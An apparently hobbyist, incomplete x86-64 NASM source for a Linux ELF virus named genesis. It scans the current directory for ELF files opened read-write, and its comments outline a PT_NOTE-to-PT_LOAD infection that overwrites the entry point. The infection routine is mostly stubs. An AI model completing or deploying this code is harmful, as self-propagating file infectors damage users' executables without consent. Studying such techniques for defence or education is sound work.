;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                                                             genesis.asm ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

; nasm -f elf64 genesis.asm -o genesis.o
; ld genesis.o -o genesis

; Note: Because I'm weird I decided to use camelCase for 
;       variables and macros. Jokes aside, for this I wanted
;       to experiment by approaching ASM like an high-level
;       language, thus making it *hopefully* more readable
;       for people unfamiliar with ASM. Different Source 
;       Files may be treated as namespaces.

%include "src/Macros.asm"
%include "src/Structs.asm"

global _start
_start: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
  ;; SAVE ARGV >------------------------------------------------------------<

  mov   r15,  rsp

  ;; ENUM FILES >-----------------------------------------------------------<

  push  "."
  Open  rsp,  0x00, O_RDONLY  ; rax = Open(".", 0, 0)

  test  rax,  rax             ; if (rax < 0)
  jl    VExitRoutine          ;   exit()

  sub   rsp,  0x04            ; place for magic
  push  0x00
  push  rax                   ; save fd
  push  0x00                  ; bytes read ( thanks vrzh )
  sub   rsp,  SZ_DENT
  
  GetDents64 [rsp + SZ_DENT + 8], rsp, SZ_DENT  ; GetDents64(fd, buf, buflen)
  test  rax,  rax
  jl    .EnumDirDone

  xor   rcx,  rcx             ; Counter   = 0
  mov   [rsp + SZ_DENT],  rax ; EndCount  = rax

  .EnumFiles:
    cmp   byte [rsp + rcx + linux_dirent64.d_type], DT_REG
    jne   .NextIteration

    ;; GET FILE >-------------------------------------------------------------<
    
    lea   r13, [rsp + rcx + linux_dirent64.d_name]
    
    Open  r13,  0x00,   O_RDWR
    test  rax,  rax
    jl   .NextIteration
  
    mov   rbx,  rax   ; save fd
    
    lea   r14,  [rsp + SZ_DENT + 16]
    Read  rbx,  r14, 4
    cmp   rax,  0x04
    jne   .NextFile

    ;; CHECK IF ELF >---------------------------------------------------------<
    
    cmp   dword [r14], ELF_MAGIC
    jne   .NextFile

    ;; CHECK ALREADY INFECTED >-----------------------------------------------<
    
    nop
    nop
    nop

    ;;;; IF NOT -> CONTINUE >-------------------------------------------------<
    ;;;; ELSE -> EXIT >-------------------------------------------------------<
    jne   .NextFile

    call  Infect
    jmp   .EnumDirDone

  .NextFile:
    Close rbx

  .NextIteration:
    add   cx, word [rsp + linux_dirent64.d_reclen]  ; len
    cmp   cx, word [rsp + SZ_DENT]                  ; bytes_read
    jne   .EnumFiles

.EnumDirDone:
  Close rbx
  add   rsp, SZ_DENT
  pop   rdi
  Close [rsp]


VExitRoutine: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
  Exit 0x00

Infect:
  push  rbp
  sub   rsp,  0x00

  ;; STAT + MMAP >----------------------------------------------------------<
  
  mov rdi, r13
  
  nop
  nop
  nop

  ;; SAVE OLD ENTRY >-------------------------------------------------------<
  ;; LOOP THROUGH PHDR >----------------------------------------------------<
  ;;;; IF PH_TYPE -> PT_NOTE THEN BREAK >-----------------------------------<
  ;; CONVERT TO PT_LOAD >---------------------------------------------------<
  ;; WRITE SELF AT LOCATION >-----------------------------------------------<
  ;; OVERWRITE ENTRYPOINT >-------------------------------------------------<
  ;; WRITE OLD ENTRYPOINT AT SELF >-----------------------------------------<
  ;; EXEC PAYLOAD (PRINT STDOUT) >------------------------------------------<

  xor   rax,  rax
  pop   rbp
  ret
